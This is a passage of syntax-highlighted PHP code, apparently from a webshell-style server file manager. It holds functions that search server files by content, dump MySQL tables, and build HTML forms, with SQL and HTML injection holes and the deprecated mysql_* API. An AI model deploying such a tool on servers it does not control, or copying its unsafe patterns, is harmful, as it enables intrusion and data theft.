<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span>($<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'.'</span> &amp;&amp; $<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'..'</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">is_file(</span>$<span style="color: #ffcc66;">f</span>) &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">in_array(</span>$<span style="color: #ffcc66;">ext</span>, <span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">explode(</span><span style="color: #66cccc; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #ffcc66; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">find</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">re</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ( <span style="color: #cccccc; background-color: #2d2d2d;">preg_match(</span><span style="color: #66cccc;">'@'</span>.$<span style="color: #ffcc66;">content</span>.<span style="color: #66cccc;">'@'</span>,$<span style="color: #ffcc66;">file</span>) || <span style="color: #cccccc; background-color: #2d2d2d;">preg_match(</span><span style="color: #66cccc;">'@'</span>.$<span style="color: #ffcc66;">c</span><span style="color: #ffcc66; text-decoration: underline;">ontent</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">'@'</span><span style="text-decoration: underline;">, @</span><span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">file_get_contents(</span><span style="text-decoration: underline;">$</span><span style="color: #ffcc66; text-decoration: underline;">f</span><span style="text-decoration: underline;">)) ){</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">find</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ( <span style="color: #cccccc; background-color: #2d2d2d;">strstr(</span>$<span style="color: #ffcc66;">file</span>, $<span style="color: #ffcc66;">content</span>) || <span style="color: #cccccc; background-color: #2d2d2d;">strstr(</span> @<span style="color: #cccccc; background-color: #2d2d2d;">file_get_contents(</span>$<span style="color: #ffcc66; text-decoration: underline;">f</span><span style="text-decoration: underline;">),$</span><span style="color: #ffcc66; text-decoration: underline;">content</span><span style="text-decoration: underline;"> ) ) {</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">find</span> = <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">find</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'filename'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span>$<span style="color: #ffcc66;">nowpath</span>,<span style="color: #66cccc;">''</span>,$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'size'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">sizecount(</span>@<span style="color: #cccccc; background-color: #2d2d2d;">filesize(</span>$<span style="color: #ffcc66;">f</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'mtime'</span>]=<span style="color: #99cc99;">@date</span>(<span style="color: #66cccc;">'Y-m-d H:i:s'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">filemtime(</span>$<span style="color: #ffcc66;">f</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'filechmod'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getChmod(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'fileperm'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getPerms(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'fileowner'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getUser(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'dirlink'</span>]=$<span style="color: #ffcc66;">dir</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'server_link'</span>]=$<span style="color: #ffcc66;">f</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">j</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">closedir(</span>$<span style="color: #ffcc66;">dh</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">clearstatcache(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">filedata</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">qy</span>($<span style="color: #ffcc66;">sql</span>) {<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">mysqllink</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #999999; font-style: italic;">//</span><span style="color: #999999; font-style: italic;">echo $sql.'&lt;br&gt;';</span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = $<span style="color: #ffcc66;">error</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>(!$<span style="color: #ffcc66;">res</span> = @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_query(</span>$<span style="color: #ffcc66;">sql</span>,$<span style="color: #ffcc66;">mysqllink</span>)) {<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> <span style="color: #99cc99;">if</span>(<span style="color: #cccccc; background-color: #2d2d2d;">is_resource(</span>$<span style="color: #ffcc66;">res</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">1</span>;<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">2</span>;
<span style="background-color: #515151;"> </span>   }<span style="color: #f2777a; background-color: #515151;">   </span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">q</span>($<span style="color: #ffcc66;">sql</span>) {<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">mysqllink</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> @<span style="color: #cccccc; background-color: #2d2d2d;">mysql_query(</span>$<span style="color: #ffcc66;">sql</span>,$<span style="color: #ffcc66;">mysqllink</span>);
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">fr</span>($<span style="color: #ffcc66;">qy</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">mysql_free_result(</span>$<span style="color: #ffcc66;">qy</span>);
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">sizecount</span>($<span style="color: #ffcc66;">fileSize</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">size</span> = <span style="color: #cccccc; background-color: #2d2d2d;">sprintf(</span><span style="color: #66cccc;">"%u"</span>, $<span style="color: #ffcc66;">fileSize</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">size</span> == <span style="color: #cccccc; background-color: #2d2d2d;">0</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #66cccc;">'0 Bytes'</span> ;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">sizename</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span><span style="color: #66cccc;">' Bytes'</span>, <span style="color: #66cccc;">' KB'</span>, <span style="color: #66cccc;">' MB'</span>, <span style="color: #66cccc;">' GB'</span>, <span style="color: #66cccc;">' TB'</span>, <span style="color: #66cccc;">' PB'</span>, <span style="color: #66cccc;">' EB'</span>, <span style="color: #66cccc;">' ZB'</span>,<span style="text-decoration: underline;"> </span><span style="color: #66cccc; text-decoration: underline;">' YB'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">round(</span> $<span style="color: #ffcc66;">size</span> / <span style="color: #cccccc; background-color: #2d2d2d;">pow(1024</span>, ($<span style="color: #ffcc66;">i</span> = <span style="color: #cccccc; background-color: #2d2d2d;">floor(log(</span>$<span style="color: #ffcc66;">size</span>, <span style="color: #cccccc; background-color: #2d2d2d;">1024</span>)))), <span style="color: #cccccc; background-color: #2d2d2d;">2</span>) . $<span style="color: #ffcc66;">sizen</span><span style="color: #ffcc66; text-decoration: underline;">ame</span><span style="text-decoration: underline;">[$</span><span style="color: #ffcc66; text-decoration: underline;">i</span><span style="text-decoration: underline;">];</span>
}
<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">sqldumptable</span>($<span style="color: #ffcc66;">table</span>, $<span style="color: #ffcc66;">fp</span>=<span style="color: #cccccc; background-color: #2d2d2d;">0</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">mysqllink</span>;

<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tabledump</span> = <span style="color: #66cccc;">"DROP TABLE IF EXISTS `$table`;\n"</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">res</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SHOW CREATE TABLE $table"</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">create</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_row(</span>$<span style="color: #ffcc66;">res</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tabledump</span> .= $<span style="color: #ffcc66;">create</span>[<span style="color: #cccccc; background-color: #2d2d2d;">1</span>].<span style="color: #66cccc;">";\n\n"</span>;

<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">fp</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fwrite(</span>$<span style="color: #ffcc66;">fp</span>,$<span style="color: #ffcc66;">tabledump</span>);
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">tabledump</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tabledump</span> = <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">rows</span> = <span style="color: #cccccc; background-color: #2d2d2d;">q(</span><span style="color: #66cccc;">"SELECT * FROM $table"</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span> ($<span style="color: #ffcc66;">row</span> = <span style="color: #cccccc; background-color: #2d2d2d;">mysql_fetch_assoc(</span>$<span style="color: #ffcc66;">rows</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span>($<span style="color: #ffcc66;">row</span> <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">k</span>=&gt;$<span style="color: #ffcc66;">v</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">row</span>[$<span style="color: #ffcc66;">k</span>] = <span style="color: #66cccc;">"'"</span>.@<span style="color: #cccccc; background-color: #2d2d2d;">mysql_real_escape_string(</span>$<span style="color: #ffcc66;">v</span>).<span style="color: #66cccc;">"'"</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">tabledump</span> = <span style="color: #66cccc;">'INSERT INTO `'</span>.$<span style="color: #ffcc66;">table</span>.<span style="color: #66cccc;">'` VALUES ('</span>.<span style="color: #cccccc; background-color: #2d2d2d;">implode(</span><span style="color: #66cccc;">", "</span>, $<span style="color: #ffcc66;">row</span>).<span style="color: #66cccc;">');</span><span style="color: #66cccc; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #66cccc; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">fp</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fwrite(</span>$<span style="color: #ffcc66;">fp</span>,$<span style="color: #ffcc66;">tabledump</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">tabledump</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fwrite(</span>$<span style="color: #ffcc66;">fp</span>,<span style="color: #66cccc;">"\n\n"</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">fr(</span>$<span style="color: #ffcc66;">rows</span>);
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">p</span>($<span style="color: #ffcc66;">str</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">echo</span> $<span style="color: #ffcc66;">str</span>.<span style="color: #66cccc;">"\n"</span>;
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">tbhead</span>() {
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;'</span>);
}
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">tbfoot</span>(){
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;/table&gt;'</span>);
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">makehide</span>($<span style="color: #ffcc66;">name</span>,$<span style="color: #ffcc66;">value</span>=<span style="color: #66cccc;">''</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;"</span>);
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">makeinput</span>($<span style="color: #ffcc66;">arg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>)){
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'size'</span>] = $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'size'</span>] &gt; <span style="color: #cccccc; background-color: #2d2d2d;">0</span> ? <span style="color: #66cccc;">"size=\"$arg[size]\""</span> : <span style="color: #66cccc;">"size=\"100\""</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'extra'</span>] = $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'extra'</span>] ? $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'extra'</span>] : <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'type'</span>] &amp;&amp; $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'type'</span>] = <span style="color: #66cccc;">'text'</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>] = $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>] ? $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>].<span style="color: #66cccc;">'&lt;br /&gt;'</span> : <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'class'</span>] = $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'class'</span>] ? $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'class'</span>] : <span style="color: #66cccc;">'input'</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'newline'</span>]) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;p&gt;$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$</span><span style="color: #66cccc; text-decoration: underline;">arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;&lt;/p&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"$arg[title]&lt;input class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg</span><span style="color: #66cccc; text-decoration: underline;">[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">makeselect</span>($<span style="color: #ffcc66;">arg</span> = <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>)){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'onchange'</span>]) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">onchange</span> = <span style="color: #66cccc;">'onchange="'</span>.$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'onchange'</span>].<span style="color: #66cccc;">'"'</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>] = $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>] ? $<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'title'</span>] : <span style="color: #66cccc;">''</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'newline'</span>]) <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">'&lt;p&gt;'</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"$arg[title] &lt;select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\"</span><span style="color: #66cccc; text-decoration: underline;"> $onchange&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">is_array(</span>$<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'option'</span>])) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'nokey'</span>]) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'option'</span>] <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">value</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'selected'</span>]==$<span style="color: #ffcc66;">value</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;option value=\"$value\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;option value=\"$value\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">foreach</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'option'</span>] <span style="color: #99cc99;">as</span> $<span style="color: #ffcc66;">key</span>=&gt;$<span style="color: #ffcc66;">value</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">arg</span>[<span style="color: #66cccc;">'selected'</span>]==$<span style="color: #ffcc66;">key</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;option value=\"$key\" selected&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">p(</span><span style="color: #66cccc;">"&lt;option value=\"$key\"&gt;$value&lt;/option&gt;"</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
